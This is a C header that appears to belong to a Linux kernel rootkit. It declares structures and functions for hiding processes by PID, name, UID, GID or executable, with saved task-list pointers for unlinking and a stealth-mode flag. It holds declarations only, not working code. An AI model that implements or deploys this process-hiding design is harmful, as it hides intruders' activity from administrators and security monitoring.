#ifndef PROCESS_HIDING_H
#define PROCESS_HIDING_H

#include <linux/sched.h>
#include <linux/types.h>
#include <linux/list.h>

#define MAX_HIDDEN_PROCS 1024
#define PROC_NAME_LEN 16

typedef enum {
    HIDE_BY_PID,
    HIDE_BY_NAME,
    HIDE_BY_UID,
    HIDE_BY_GID,
    HIDE_BY_EXEC,
    HIDE_ALL
} hide_criteria_t;

typedef struct {
    pid_t pid;
    char name[PROC_NAME_LEN];
    uid_t uid;
    gid_t gid;
    char exec_path[PATH_MAX];
    struct task_struct *task;
    struct list_head original_list;
    struct list_head *original_prev;
    struct list_head *original_next;
    int hidden;
    hide_criteria_t criteria;
} proc_hide_ctx_t;

typedef struct {
    proc_hide_ctx_t hidden_procs[MAX_HIDDEN_PROCS];
    int count;
    int stealth_mode;
    int preserve_stats;
} proc_hider_ctx_t;

int hide_process(pid_t pid, hide_criteria_t criteria, const char *param);
int unhide_process(pid_t pid);
int hide_processes_by_criteria(hide_criteria_t criteria, const char *param);
int unhide_all_processes(void);
int is_process_hidden(pid_t pid);
int init_process_hider(void);
void cleanup_process_hider(void);

#endif